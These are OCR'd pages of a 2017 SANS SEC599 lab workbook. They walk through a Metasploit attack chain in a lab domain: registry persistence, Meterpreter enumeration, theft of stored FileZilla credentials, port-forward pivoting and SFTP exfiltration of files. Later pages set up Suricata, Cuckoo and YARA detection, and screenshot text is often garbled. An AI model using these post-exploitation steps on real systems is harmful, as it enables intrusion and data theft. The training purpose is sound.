24. Installation - Selecting persistence mechanism A common persistence technique on Windows-based systems is the use of the local registry, where a "run" key is written which will force t he system to launch an executable or script at boot/ log on. The "exploit/windows/localjregistry_persistence" implements this exact technique in metasploit, so let's look at the available options!
msf exploit(openoffice_document_ macro) > use exploit/windows/local
/ registry_persistence
msf exploit(registry_ persistence) > show options

© 2017 Erik Van Buggenhout & Stephen Sims

29

r
I Fate Edit V..ew Search Terminal Help

Terminal

0 0 0

25. Installation - Configuring persistence mechanism

When reviewing the options for the "exploit/windows/localjregistry_persistence"

module, we notice it requires a "SESSION" parameter. This is the session identifier

.....

of our meterpreter session (in most cases, this would be 1). We should thus

configure it using the following command:

msf exploit(registry_ persistence) > set SESSION 1

This is the case for the majority of post-exploitation modules: they just ride on your

--

existing session so only need minimal configuration! As we can see, this module will

store they payload as a blob in the registry and create an autorun key for it to

execute on boot.

The other options can be finetuned for a more fine-grained attack, but the default settings are fine for our purposes.

26. Installation - Achieving persistence
Once the session is configured, we can run the module with the "exploit" command:
msf exploit(registry_persistence) > exploit
The output should be fairly verbose and indicate that the blob was correctly created and the autorun registry key was also available. Note the RC file that is generated as well: this is a "clean-up" script you can provide to the Meterpreter, to clean up its persistence.

30

© 2017 Erik Van Buggenhout & Stephen Sims

File Edit View Search Terminal Help

Terminal

27. Command &amp; Control - Assess C&amp;C Channel
The Command & Control channel we are using was defined at the start of our attack and we've been using it ever since t he exploitation phase.
The Metasploit Meterpreter supports a wide variety of control channels.
In our specific case, we selected the HTTP protocol for our connectivity. It's interesting to note although HTTP itself is a clear-text protocol, Meterpreter uses its own encryption layer on top of HTTP. We could of course also just configure the Meterpreter to use HTTPS instead of HTTP, which could potentially defeat security controls that don't do SSL/TLS interception.
A brief description of the connectivity you have set up can be seen by running the "sessions" command:
msf exploit(registry_persistence) > sessions

28. Command &amp; Control - System enumeration Let's start interacting with our Meterpreter backdoor again:

© 2017 Erik Van Buggenhout & Stephen Sims

31

msf exploit(registry_ persistence) > sessions -i 1
If we want to continue enumerating the type of access we have just obtained, we could also use normal Windows commands for enumeration (e.g. the "net" suite). We can drop from the Meterpreter to a normal Windows command line by issuing the following command:
meterpreter > shell
We can then use standard Windows commands to further enumerate information from the target environment (e.g. get information on domain users). We will use the "net" built-in Windows command to enumerate user information :
C:\Program Files (x86)\0pen0ffice 4\Program> net users /domain
This command will query domain-level user information and return the following:
o The target domain is synctechlabs.com; o The domain controller is DC.synctechlabs.com; o There's at least 6 users configured in this domain.
To go back to the Meterpreter, just run the "exit" command at the command line:
C:\Program Files (x86)\0pen0ffice 4\Program> exit

File Edit View Search Terminal Help

Termlnat

0 G> 0

29. Actions on objects - System enumeration

Let's background our meterpreter session again:

32

© 2017 Erik Van Buggenhout & Stephen Sims

meterpreter> background

An interesting post-exploitation module is the "enum_applications" module, which will enumerate installed software versions on the infected machine. We can select it and view its options using the following syntax:
msf exploit(registry_persistence) > use post/windows/gather
/enum_applications
msf post(enum_applications) > show options

As with the majority of post-exploitation modules, it only requires the SESSION identifier to be configured.
msf post(enum_applications) > set SESSION 1 msf post(enum_applications) > exploit

The output of the enum_applications command provides a detailed list of installed software on the victim system. This software overview can be highly useful to launch further attack stages (e.g. vulnerabilities in installed software that could lead to local privilege escalations).

In our example however, we can identify a FileZilla Client and Mozilla Thunderbird. These are applications that could typically store end-user credentials locally. Metasploit has built-in support in its post-exploitation modules to easily extract this type of information.

File Edit View Search Terminal Help

Terminal

080

30. Actions on object - credential gathering We can now search the Metasploit framework for "FileZilla":

© 2017 Erik Van Buggenhout & Stephen Sims

33

msf post(enum_applications) > search FileZilla
There appears to be an interesting post exploitation module we could use: "post/multi/ gather/ filezilla_client_cred". This module can extract locally stored Filezilla credentials from different Operating Systems!

31. Actions on obj ects - credential gathering
We can select & configure the "filezilla_client_cred" module by setting our session identified using the SESSION variable:
msf post(enum_applications) > use post/multi/gather/filezilla_client_cred msf post(filezilla_client_cred) > set SESSION 1
Once this is completed, we can execute the module using the "exploit" command:
msf post(filezilla_client_cred) > exploit
The output above lists some interesting credent ials
Server: 192.168.20.10:22 Protocol: SSH Username: dschrute Password: 8!v+BkHbpS;1
These appear to be credent ials for an internal system, possibly used to store internal development documents... So how can we as adversaries obtain access to this internal system? The answer is pivoting!

34

© 2017 Erik Van Buggenhout & Stephen Sims

~ f tle Ed,t V,ew Search Term111al Help

·.f

,,j -

Terminal

oeo

., :~· J t;'_,lP ll I ff'

;'. ~~ ·. ·, t ·I-,·, i '·, : I 1 ' , ·, ·· 3,-· ·;- ·· ·1, -~;:·,'-,(,'! t ·'!.: 3;~4~i 1 i :' li

._.. i ~. :

, 11' 1 ro! [H_- ,l
r t,r t

'·,UO p, · I ,. di:t· ·'' f , .· : ·,t ,)I I

,,.....

.·1·:

,:,.:., ·

11 ,: r,- ,., T · ,., ,t·I ·

' ; t· ·, t1 t' {

;., 1 ··...

;:· ,·i·,1,.11:,: ·., l

32. Action on objectives - Setting up the pivot
By using the built-in networking features in Metasploit, we can use our existing Meterpreter session as a bridge into the target network. We will use the "portfwd" function in the Meterpreter to forward traffic to the internal address we just identified! We can do this as follows:

msf post(filezilla_client_cred) > sessions -i 1
meterpreter > portfwd add -I 2222 -r 192.168.20.10 -p 22
-I stands for the local port to start listening on (on the attacker machine); -r stands for the remote host to connect to (in the victim network); -p stands for the remote port to connect to (in the victim network).
The big advantage of this technique is that we can now use tools outside of Metasploit to interact with our local listener on port 2222 and interact with internal target systems as if we were sitting right next to them in the internal network!

File Edit View Search Terminal Help

Terminal

oe o

33. Action on Objectives - Data exfiltration!
Once we have set up our portforward in Metasploit with portfwd, we can connect to our own localhost on port 2222, where Metasploit will forward the traffic to the internal system on port 22. In order to access the SFTP service, we can use the built-in SFTP client in our Linux environment.
© ?n17 F rik \/::1n R11nnPnhr111t ~ ~tPnhPn ~im._

To do so, we can enter the following command in a new terminal (do NOT close the Metasploit terminal):
root@kali:"'# sftp -P 2222 dschrute@127.0.0.1
We will attempt to authenticate to the internal system 192.168.20.10 as user dschrute, but will instruct sftp to connect to localhost port 2222. Again, Metasploit will take care of the port forwarding.
Note: As this is the first time you are connecting, you may receive a warning from the sftp client, indicating that this is an unknown host you are connecting to. You can enter "yes" to continue your connection.
Next, a password will be requested, which you previously extracted C'B!v+BkHbpS;l''). Once authentication you will receive the following prompt:
sftp>
We can use the "pwd" and "Is" commands to understand where in the file system we are currently situated:
sftp> pwd
As a result of pwd, you will notice we are currently in the home directory of dschrute (/home/dschrute).
sftp> Is
The Is command will show us some interesting files that are linked to Osprey. We can now also download them using the standard sftp client, using the "get" command (we use a wildcard after Osprey to download multiple files):
sftp> get Osprey*
Note that all of this communication is "double encrypted": it is first going over the encrypted Metasploit Meterpreter session and afterwards it is also encrypted by OpenSSH (as an SSH service is used). If you have some time left, feel free to open the stolen documents and see what great trade secrets were just compromised!

36

© 2017 Erik Van Buggenhout & Stephen Sims

root@kall: ~

oeo

© 2017 Erik Van Buggenhout & Stephen Sims

37

This page intentionally left blank.

38

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-2.1: Exercise - Building a sandbox using Suricata & Cuckoo
Objective
For this course, we have created a full install of Cuckoo on an Ubuntu-based host. The course author further reworked the Cuckoo Auto-Install script and included it in the Course USS. Feel free to reuse it or tweak it further. Furthermore, we have installed Suricata IDS / IPS on the mail server, where we will perform both URL and SMTP extraction. Although all required software components are already installed, you will have to perform the final configuration and properly interpret the results.
The Ubuntu Cuckoo host has been configured in the following way:

· IP address 192.168.30.15 (Cuckoo web interface is available at 192.168.30.15:8000, while the API is available at 192.168.30.15:8090)
· VirtualBox has been installed · A Windows VM (Windows 7 32-bit) has been installed & configured in Cuckoo

The mail server has been configured in the following way:

· IP address 192.168.20.10 · Suricata has been installed and is listening on the mail server network interface

So, what are the missing parts?
· Suricata hasn't been configured to perform SMTP file & URL extraction · There is no link between Cuckoo & Suricata

In order to increase the added value for attendees, we have added the full solution as virtual machines to the course USB drives.
Scenario Virtual Machines
1. SEC599-C01 - Kali 2. SEC599-C01 - Firewall 3. SEC599-C01 - Ubuntu02 4. SEC599-C01 - Ubuntu0l 5. SEC599-C01 - DomainController 6. SEC599-C01 - Windows02
Exercise 1: SECS99-2.1: Exercise - Building a sandbox using Suricata &amp; Cuckoo

1. Authenticate to Windows In the first step of this lab, please authenticate to the Windows machine using the following credentials:

© 2017 Erik Van Buggenhout & Stephen Sims

39

-Username: SYNCTECHLABS\Nick Fury -Password: Awesomesauce123
We will use this system as a base system from which we will connect to our mail server and sandbox.
2. Open Mozilla Thunderbird Let's open up our standard e-mail client: Mozilla Thunderbird. You can find it on the desktop! Once opened, it should open up the mailbox for "jobs@synctechlabs.com", you should see that there are no incoming mails (we of course cleaned out the malware you sent on the first day...)
3. Use putty to connect to the mail server We will now start analyzing how our mail infrastructure is set up. As a first step, connect to our mail server using Putty. You can find Putty on the desktop, of the Windows machine.
The mail server is in the Synctechlabs DMZ and has the following details:
-IP address: 192.168.20.10 -Username: sec599 -Password: sec599
Should you receive a security warning from Putty, this is because it's the first time you are connecting to t he machine. You can j ust click "Yes" and proceed.

4. Switch user to root
As we want to administer the mail server, let's assume root privileges in our putty session with the following command:

sec599@webmail:"'$ su root root@webmail : / h o m e / s e c 5 9 9 #

This command will request you to enter t he password for the root user, which is also "sec599".

40

© 2017 Erik Van Buggenhout & Stephen Sims

5. Assess Suricata configuration file
The default Suricata configuration file is o /etc/suricata/suricata.yaml
We can open the configuration file by using the following command (we will use the nano texteditor for this):
root@webmail:/home/sec599# nano /etc/suricata/suricata.yaml
We can review the configuration file to understand how Suricata is configured. Some of the interesting sections of this file include:
o Network variables o Alerts - Enable or disable IDS alerts o Rules (what IDS rules will be triggered) o HTTP - Enable or disable HTTP logging o SMTP - Enable or disable SMTP loggin o FILE - Enable or disable extraction from files from certain protocols We can close the configuration file by using the "CTRL+X" key combination, which will close nano. Should nano ask you if you would like to save any changes you made, please press "N" for "No".

© 2017 Erik Van Buggenhout & Stephen Sims

41

6. Configure interface checksum offloading
The devil is in the detail... Due to modern NIC's often performing checksum offloading, Suricata can have difficulties properly parsing & extracting files from the
network streams. It is therefor important we disable NIC checksum validation using
the following commands:

ethtool -K ethO tso off ethtool -K ethO gro off ethtool -K ethO lro off ethtool -K ethO gso off ethtool -K ethO rx off ethtool -K ethO tx off ethtool -K ethO sg off ethtool -K ethO rxvlan off ethtool -K ethO txvlan off

As we want to make the lab run as smoothly as possible for you, we've included these commands in the /etc/suricata/disableoffloading.sh script. You can just execute this from the command line using the following command:

root@webmail:/home/sec599# /etc/suricata/disableoffloading.sh

As a result of running this script, you may receive a number of warnings (4 warnings should be visible) indicating that some settings couldn't be changed. This is normal & expected, as the default Ubuntu configuration already has some of these settings well-configured and it thus can't change the settings.

4?

© 2017 Erik Van Buaaenhout & Steohen Sims

You can find more information on Suricata & offloading issues here:
https://redmine.openinfosedoundation.org/projects/suricata /wiki/File_Extraction

7. Enable Suricata SMTP extraction
We will now enable Suricata's SMTP logging feature, which will start generating an SMTP log. This is a fairly easy configuration switch, as we just have to uncomment all of the lines in the "smtp" intend of the configuration file (/etc/suricata /suricata.yaml).
You can use a text-editor of your liking for this. Nano is a highly popular and intuitive text editor, but you can choose any other one. Please don't close nano just yet, as we need to make some more configuration changes which we'll address in the next steps!
Please refer to the attached screenshot for the expected configuration change. We will currently not further finetune the type of SMTP fields that are to be parsed. For our sandbox purposes, this perfectly suffices!

© 2017 Erik Van Buggenhout & Stephen Sims

43

8. Enable Suricata File extraction Once SMTP logging has been configured, we can configure Suricata to store any files that are identified in SMTP traffic. We can do so using the "file-store" configuration section.
We will just enable this setting, after which we will leave the rest of the settings on default. Please refer to the screenshot for a clear view on the intended configuration.

44

© 2017 Erik Van Buggenhout & Stephen Sims

,I root@webma,~ / etc/suricata
GNU nano 2.5. 3 - - - - - - - - - - = : - - - . . . , , . . . , , . . ~ - - - - - - - - - - - - 1

9. Enable Suricata File log
Next to file extraction, we also want Suricata to keep a logfile of all extracted files. This can be done by setting the "file-log" configuration section.
Again, we can just enable this and leave the default configuration settings.
Upon configuring this line, we can close the file by pressing CTRL+ X (if you use
nano), after which you should confirm you want to save changes (by entering "Y").

© 2017 Erik Van Buggenhout & Stephen Sims

45

10. Restart Suricata
.......
We can now relaunch Suricata using:

root@webmail:/home/sec599# service suricata restart

This will relaunch the Suricata daemon, hereby reloading the configuration file! We

......

can review whether Suricata started successfully by entering

root@webmail:/home/sec599# service suricata status

If no errors is displayed, we are in good shape!

.......

.......

......
11. Testing our results - Switching to the attacker!

46

© 2017 Erik Van Buggenhout & Stephen Sims

Let's now test the effectiveness of our solution! We will now shortly play an attacking role and send a sample payload that is sent to our victim environment.

For this, please switch to your Kali Linux machine, which uses the following credentia Is:

Username: root Password: sec599
12. Sending the payload
As this is not an offensive course, we will not create a new custom malware, but will rely on one of the samples that is available in our "Desktop/Day 2 Samples/" directory (generated by yours truly). Let's select the cv.vbs file and send it to our jobs mailbox Uobs@synctechlabs.com)!

You can again use the feistymail.com mailbox of Jim Persons! Details:

Username: jim.persons@feistymail.com Password: S3cr3t123

0 Rounckube Webma1l

Roundcube Webmall :: Compose - Mozilla Firefox

0 e, 0

-APT-1337 ·
e roundcube

\!J I ·

.z,

J. · 0 · · I

Q.
DI ~QOili-tt, EJ Gl>IIIIILDAPA!bas lloc!c

f,c,m

r"' - [lffl 1>«rmo0!=1Ymot::-:Y) /

To Slqet!

job>~.c..,,
Q Add O Adell O
All!>k...,., fol A po,,-.

Edlal'fllOI Pm· - ,. , Prory -

O R<W To

AdllF~TD

~Y·-- · r _,.,..,_ 0

Please find attached rry awhcauon for a Job at
~ $.COIi!

IJ.uhun llowcd Iii, CCI IS 2JI Mil

cv.Yl>t (7 KB)

· t

13. Submitting a sample manually in Cuckoo Let's switch back to our Windows machine (and thus our victim).

We have created a bookmark page to our instance of Cuckoo (which is running at IP address 192.18.30.15 on port 8000). This is a default Cuckoo install without any "fancy" tricks or tweaks!

Let's manually upload the sample we received in our mailbox! We can do this by:

.......

© 2017 Erik Van Buggenhout & Stephen Sims

47

o Save the cv.vbs attachment to our Windows Desktop o Opening the Chrome browser (it's pinned to the Start bar) o Opening Cuckoo from the favorites tab o Clicking the "Submit File" function o Selecting the cv.vbs file from the Windows Desktop

)(

f-

C © 192.168-30.1 S 000

W PIScOS< f,r., 'i; Cud<oo S.ootio.. 0 N·nus Horn, / Log,o W MIS?

e

0 X

* ;

Insights
Cuckoo IM1311at,on

Cuckoo
SUBM IT A FILE FOR ANALYSIS

SUBMIT URLS/HASHES
:ubmt u. s ;he"

.....

lffit@!i

O DrllQ -,OLI' file into th<! left (Niki or chck tri. lcOn to M>lect · fll·

System ,nfo

mm m

14. Reviewing Cuckoo results Once the report has been generated (analysis marked as "reported" in Cuckoo), let's have a look at the summary:
o What kind of scoring did it receive? o What IP address is it trying to connect to? o What signatures are matching?
0
Take your time to browse through Cuckoo's interface (please don't limit yourself to the Summary) and have a look at the different tabs available at the left of the web interface. Excellent examples include "Behavior Analysis", "Network Analysis", ...

48

© 2017 Erik Van Buggenhout & Stephen Sims

~--· "

- - - - - - - - f- 0 CD 192.168.30.15 00-0/a~ , IS/I/summary

· ·

· . · ii

· ·

~

cuc~oo '. _~ ft Dashboard ii: RecE"nl O: Pending Q Search

e

CJ X

* ;

0 0 Summary

4II cv.wm

G)

e

I File cv.vbs

~ Score

~

SUmmar,

TN$ 11kt IS V«y ~ Wllh 8 score o l 5.0 out ol 10I

0

Size 72KB

,,h T~ ASCII le·! ..,th Yet)! long Imes, .. CRLF. Lf '"~ term,neto,s

,__.Mia ThtKOClll9&ftt.lmMCUffa'\Vj'llll W1

r-,

8

~and ~Meo,:~.,, _,. 'N·..n

MOS 73Zd9S12S7d7U73d18bb"Sl>6b&f4<d

G

~ Feedback

0
e

SHA256 S28c.&af698S4t>fcbd6436e77289e7f532317PS33t>fe4ea653.3cee.3S2cu2eeb

...~,.-

G

CRC32 066BSBF4

0

udffp None

8

15. Automating the solution!
We can of course not expects users to recognize & submit potentially attachments themselves. In the final step of this lab, we will add a script on our Suricata machine that will automatically submit any extracted files to the Cuckoo API !

Our solution relies on two components:
o suricatafilemonitor.sh: A small script that will "watch" the /var/log/suricata /files directory for any new entries. If any are found, the script will call cuckoosubmit.py
o cuckoosubmit.py: A python script that will submit the cuckoo sample
You can start our "automation" by running the following command in the Putty session you still have opened to 192.168.20.10:

root@webmail: / home/sec599# /etc/suricata/suricatafilemonitor.sh

If you have additional time, please feel free to analyze how these scripts work!

© 2017 Erik Van Buggenhout & Stephen Sims

49

16. Sending our payload again Please repeat the exact same steps from step 12. You can now opt to send the .exe file instead of the .vbs file and assess the differences...
17. Keeping an eye on Cuckoo Our automated analysis script will not provide you with a lot of feedback. However, let's switch back to the Windows02 machine...
If you now browse the Cuckoo interface you should see a sample that was
automatically added to the Cuckoo queue! Congratulations, you've built your very own mail sandbox using only open-source components!

50

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-2.2: Exercise - Finding the needle in the haystack using YARA
Objective
During this exercise, we will get familiar with YARA! We will leverage YARA in the following ways:
· Generate YARA rules for a known payload/ malware sample (We will use the EyePyramid sample we analyzed yesterday)
· Find related malware samples in a large dump of samples In order to achieve this, you will need to complete the following exercise steps:
· Analyze the EyePyramid sample we loaded in Cuckoo Sandbox yesterday. · Develop a YARA rule that can successfully match your file! As a second part of the exercise, we will now do the following · Use YaraGenerator.py to create YARA rules for the provided malware sample
"yaragenerator_sample" · Find related samples in the "dump" directory
Scenario
Virtual Machines
1. SEC599-C01 - DomainController 2. SEC599-C01 - Firewall 3. SEC599-C01 - Ubuntu02 4. SEC599-C01 - Windows
Exercise 1 : SECS99-2.2
During this exercise, we will get familiar with YARA! We will leverage YARA in the following ways:

-Generate YARA rules for a known payload/ malware sample -Find related malware samples in a large dump of samples

1. Authenticate to Windows
We will again use our trusted workstation! You can authenticate using the following credentia Is:

Username: Nick Fury Password: Awesomesauce 123

2. Open WinSCP to copy all samples
We will analyze a number of samples on one of our dedicated malware analysis machines. Please launch WinSCP.exe in order to copy our malware samples to an Ubuntu box in our CSOC environment.

© 2017 Erik Van Buggenhout & Stephen Sims

51

We want to set up a connection to 192.168.30.15, with the following credentials:
Username: sec599 Password: sec599
As this is the first time you connect to the system, WinSCP will pop up a warning asking you if you would like to connect to an "unknown host". You can select "Yes", as you indeed want to connect to the Linux system.

Looi Marie Files Comrmncls Session Opllons Rm>ote Help

~ Quw· .

Transft1 Sdhngs Def1uft

r$ s«5990192.168.1035

New Sess,on

My documents

. ~.

Log,n

Name
L "
Visual Stud10 2017

1~ Ne:wStte
l

se.ar, ~promc:ol: SFTP

tiOCt-:

Pact,,.....:

,,....19-.21-68-.30-.-15- - - - - - - , I r:==22 :

1

7_ f:····· U:;etname:

;e::e.._ssW~Otd:_ _ _~

~ 599 _ _ _ _

3. Copy all samples from the DVD to /tmp We will copy all samples from the inserted DVD to the /tmp directory on our Linux machine using the following steps:
o Use the dropdown box on the left to change the local folder location (left window in WinSCP - currently "My Documents") to the DVD drive (D:);
o Use the dropdown box on the right to change the remote folder location (right window in WinSCP - Currently "sec599") to the "/tmp" folder;
o Drag and drop the "YARA-Malware Samples" from the left window to the right window
o Press "OK" in the "Upload" window that pops up

52

© 2017 Erik Van Buggenhout & Stephen Sims

r
--

Looi M.ut f;i.s Commtnd. Senion Opuom R......, Help

· "au-. 83.:' ~ rt' Ill 0
liljl SK5N192.168JO.IS ~ NewS.S,_

1,........ ~ o.f1ull

... D: OVD D11vtOoyZ · ('! I!]

G.l 2 '?c,

Imp

_,. Upload ·

)( · ~ P,open,e, fS(?. ~B~

. t,p .
· [II] +·

.Q F,ndf~es 'i'o
+ Yl

D:\

,-

Nome

Sa, lypt

Chongod

Fdt toldet

8/11/2017 5:20:02 PM

~,..,
rwtf·Xr·I

Own., 1001

~llo'YNIA-t~lo...,le'""°"'
[:tiN

17 . .~ A M 1H-o6:29AM 17-"-AM 17ol.-<16:27AM

, _____ f'W'Jl····--
--,.,11······

rool root root
mongo.

O r,.,,.r.,,,bo<iqi,OIRI(add...--1-r_,.,

0 0To_·_-_"-_·_··_bIa· x_

OK

4. Change destination folder name
In order to facilitate our next steps, we will rename the target destination folder from "YARA-Malware Samples" to "YARA". We can do t his by:
o Right-clicking the folder name (in the target window on the right); o Clicking "Rename" o Changing the name to YARA

tmp · wc599019Z.16&J0.15 · WonSCP

°""""' Leu! M«lt f,j,s Co,nmonds S-n

Rtmott Helf,

· ,/} 83 .._ Syncluonut

o.,..,· Ill ~ 6) Quou, ·

Ti.Mier S<tt,ngs

0 st<mG19l.168,)l).1S Ii$' NewStisH>n

I!]+ ·

~2 1ro

csrs · ..,

D X

. §-

m + .

"" fi:l ~ i} r....ir.i.. i'o

)( a5 Cg p_,.. fj '1!i +,

<y<te m d · p < N d. .S78o -
s y , t , m d - p n v , t. .S71,._
,yutm<1-pnv,t··sn...
'vARA·~.,.~.u
mo,,godb-2701i ._, Op<,,

S.,, Own!j<d
8/2/2017 l(k(),,56.\M &125/2011-29 AM &,'2SJ2017 <t06'l9 AM 8/1S/2017 ·.0W6AM
, iAM &'~17·-l6:47AM

Oov.--nlo1d...
Duploca<e.. Mo;,c lo-
)( o.,..,
,..,..,,,.

FS · Sllift,F5 Slldt·Hi
FS Fl

fil·-.(f2) Fil,

rwwt·W,ME
nrri.-.0 ~·---
Ml!- - · · t'WX······ l'Wl.nlm·'t
-

fOOI
root fOOt root
1.«S99
mongo.

5. Adding a "target" folder

~ 2017 Erik Van Buggenhout & Stephen Sims

53

Once the folder is renamed, we will perform two final changes on the target system :
o We will create a folder "target" under the "YARA" folder (double click on the YARA folder, then right-click and "New -> Directory")
o Move the "yaragenerator_sample" file to the newly created "target" folder (drag & drop in the target window)
The end-result should be a yaragenerator_sample under the "target" directory on the Linux VM (see screenshot). Once this is completed, we can close WinSCP.exe.

t11g,t · s«.Yl9019.1.16a.J0.1S · WonSCP

locol Molt fd., Comm·nd> S - - ()pt100, R.mctc Htlp

· B3 .., ~ Synd>10n,u ,I} Q:l ·

<lu<uc ·

Tr.nsftt Scmng, Othu~

0 scd99019l.16S.30.1S l;6 NewS.-."°"

O,DVOO.,,.c OO)'Z · I;' I!:] · ·

· (6 ·

·)(

0:\

i.w,..,, YAAA ·

S.mpl...

s..,, lyp, ftlcfoklff

C'-9«'
&'11/2017 ~ P M

Nome ~ r
y.,ogcne,110<_,omplt

0 X

··

ai (;) ~ IO-F,ndfffl 'rl)

e?[s 0 [!l

Sele Clwngcd &'25/201:'4 >\~,AM
91 kB S/2/201712'1S1lPM

R,glc,
fW'tlW)J··
"",...,..

Ownct 1.ttS99 sctS99

6. Analyze EyePyramid using Cuckoo In the same way we used Cuckoo yesterday, please upload the EyePyramid.exe (can be found on the DVD) to Cuckoo, we will use the results of its analysis to develop some matching YARA rules. As a small reminder:
o You can open the Cuckoo interface by launching Chrome and selecting the Cuckoo bookmark from the Bookmarks tab;
o You can upload a file by clicking the "Submit file" feature in Cuckoo and selecting the EyePyramid.exe from the "D:\YARA-Malware Samples\" folder;
o The Cuckoo configuration can remain the default one, so once the file is uploaded, we can just click the "Analyze" button on the right-hand side of the screen.

54

© 2017 Erik Van Buggenhout & Stephen Sims

-

"

Dump

~ (ytl>yr,m,d,...

"

LI )"lflg<MRIOt_,.mpl,

,....
· Videos
& <ln<On,,e

Cuckoo

lhos PC

SUBI URL'

SU8Mll AFILE

Sut

FOR

RI

--

Uug,, "'°'"licG

ANALYSIS

a

. '.

~

+

,....

-.

--

-

7. Find relevant strings in the Cuckoo report (1)
Once the analysis is running, we'll have to wait until the status page shows us "Reported"... This could take about 2 minutes, feel free to refresh the page periodically, to make sure you have the latest state of the analysis.

A common caveat is to believe Cuckoo's report has been generated once the status indicates "Completed". This is however not true, the "Completed" state means the analysis was done and that currently the report is being generated. Once the report has been generated, the status will be "Reported".

Once the sample has been "reported", let's browse the report (Click "Recent" in Cuckoo's top menu bar). We will try identifying some interesting strings that could help us detect other variants of this malicious sample. Typical strings that could be useful here include:
o Used persistence locations o PDB paths o Hostnames of C&C domains
o Commands it tries to execute o Registry keys it attempts to query / adapt o Folder locations or files it tries to read or adapt
0

© 2017 Erik Van Buggenhout & Stephen Sims

55

We can extract a first relevant string from the analysis home page:
o "w32time.dll" - It is using a dll for persistence as a Windows service (see screenshot under the "HKEY_LOCAL_MACHINE\SYSTEM \ControlSetO01\services\\W32Time\Parameters\ServiceDII"). Note that the full path is hidden due to the browser resolution...

cucl\go '..:· ~ Dashboard ,;;; Recent O: Pending Q Search

Submil

0 0
G)
e
©
0
e
~

O Pot,mhally mal!CtOUil URLs wet· loun<I m lhe p,ocess memo,y dump (SO out ol l 26 ..,enl9)

>

O Attemp19 to odenufy lnstalf@d AV ptOducts by ins1Alllruon d,r.ctory (SO out of 60 ltl/anla)

>

0 Installs Itself for autorun at Windows atartup (2 Pv..,19)

V

reg_·t>y HK(Y_LOCAL_MACHINE\$YSTEM\ControlSciOOl \st1r,,,ces\W32T1mc\lmngePa1h

reg_valUI! ~ystemRoot'i.1Syste -l<ne1s,·cs

rcg..~ey HKfY.J.OCALMACHINC\SYST[M\ControlSetOO t \sen,,cn\W32T,me\Pa-ameten\Ser.ice011 reg_val.» ~1emRoot"-\Sys1e

0 0peratn on local firewalls polocies and S4rttlngs (1 ......i)

>

8. Find relevant strings in the Cuckoo report (2)
So you've found one relevant string related to the persistence mechanism. Can you find additional ones?

The sample is attempting to identify & silence common AV software. One of the signatures in the report home page is the "modify_security_center_warnings" one.

One you click this signature for additional information, you'll see that it's trying to adapt the security notification settings for a number of AV engines. We can use these AV engines as strings:
o "KasperskyAntiVirus", "McAfeeAntiVirus", "PandaAntiVirus" - It is
trying to disable a hardcoded list of AV engines using their registry locations.

56

© 2017 Erik Van Buggenhout & Stephen Sims

"
C (i) 192.168.3015 .w'>n.,, - " mrna,y/

CJ N,-....,, Home ' Log,n W MIS?

Somplt< · Evilw·bs·

ft Dashboard ;;;; Recent O: Pending 0. Search

e
Submit

X
*

0 Attempts to ldenuly lna,lled AV products by lnslallat;o,, directory (SO 001 or 60 ...,11,)

>

0 IMtalls ,lsell for ·utorun al Window& startup (2 evenll)

>

0 opennes on ICQI firewalls policies and settings (1 ···mt)

>

"
reg,stry HKEY_LOCALMACHINE\SOFTWARE\M1crosofI \Secunty Cfflte<\Mon11onng\TrendFi<ewall\D1sableMon,t0<1"9 rt9lstry HKEY.LOCAL.MACHINE\SOnwARE.\Mierosolt\Secuuty Cen1cr\Monnonng\ComputerAssooatesAn1M,us\D,sableMom10nng registry HKEY_LOCAL.MACHINE\SOFTWAR£\M1c1osoh\Secunly Cen1e1\Momtonng\KasperskyAnt1V,rus\D1sableM011CIOMg ,eg1~tr1 HKEY_LOCAL.MACHINE\S0ffi'IARE\M1Crosol1\Secur,1y Cen1er\Momlonng\PandaMtiVlrus\O.si1bleMonlt0t'"9 reg1s11y HKEY.LOCALMACHINE\SOr.WARE\Microsolt\Secuttty Center\AIIAlertsO,sabled reg,suy HKEY.LOCALMACHlt,E\SOF'TWARC\M,crosolt\SecumyCen1er\Mon,1or1ng\McAreef'1rewnll\O,sabteMon1tonllQ reg,stry HKEY_LOCAL_MACHINE\SOFTWARE\M1crosolt\Secunty Center\Momlonng\Tinyf,rewall\DlsableMonofOMO

9. Save strings to temporary desktop file
We will now temporarily copy these strings to a notepad text file we save to our Desktop, so we can copy paste them when we write our YARA rule (later during our lab)!

{] Untitled t-4otcpad
Hl Fol Ed,i Fo m·t ~uew

Save As

w32time .dll KasperskyAntiVirus
McAfeeFirewall PandaAntiVirus

t-

~ 1' · > This PC > Desktop >

Organize .,. New folde1

1111ns1ttop

,. Name

.... Downloads
iJ Documents .,.
- Pictures
J, Music
Privilege Escalati
· Vid"'5

Harden Scripts Mik1~tz Pnv,lege Escc1lat1on SysmternalsSurte Vulnerable Software yara

4io. OneDrive

C1I This PC

Network

V (

I File name: EyePyram,d-string~

Save as type: Tot Documents ('.bet)

'_LOCALMACHINE\SOFTW " Hid" folders

Encoding: ANSI

·
V ~

1bmit

Import
X

Se!rch reslctop

p

ll:: · f)

Date mod1f1ed

Type

8/3/W17 8:58 AM 8/3/2017 9:2.8 AM ar3/20l79'01 LIM 7/2812017 8:5-! AM 813f.!017 <H2 IIM a,ry.J2017 3:53 PM

F1lefolde F,ldoldt Fdefolde FMfolde Flie fold File fold

>
v I.....__Sav_e_..., Cancel

10. Connect to the malware box using Putty

We will now set up an SSH connection to our malware analysis box using Putty. We

can use the same details:

© 2017 Erik Van Buggenhout & Stephen Sims

57

IP address: 192.168.30.15 Username: sec599 Password: sec599

As this is the first time you are connecting to the machine using Putty, Putty will also create a security warning asking you if you want to connect to this unknown host. You can click "Yes" on the prompt to continue.

~ PuTTY Configuration

Category:

l- Session

logging

[-' Terminal

Keyboard

Bell

Features

B ·Wndow

I
I

~arance

i

Behaviour

Translation

SelectJon

Colours

l::l · Connection

Data

Proxy

Telnet

Rlogin
(+ SSH Senal

X

____ Basic options for yol.l' PuTTY session

_,

Speclythe destination you want to connect to

Host Name (or IP address)
1,92.168.30.15

Port
11,2--2- - - - .

Connection type:
Q Raw Q Te1net Q Rlogin @ SSH Q Serial

Load. save ordelete a stored session Saved Sessions

~
Default Setmgs

Oose 1n'indow on exit:
0 PJw-ays O Never @Only on dean e>ot

Cancel

11. Switch user to root to allow full access All of our samples are Windows executables / malware samples so there is no real danger to our Linux analysis machine. We can thus use root privileges to analyze the file. We can use the following command in the opened Putty session:
sec599@ubuntu02:~$ su root
The password for the root user is "sec599". The prompt should change upon successfully entering the password:

58

© 2017 Erik Van Buggenhout & Stephen Sims

root@ubuntu02:/ home/sec599#
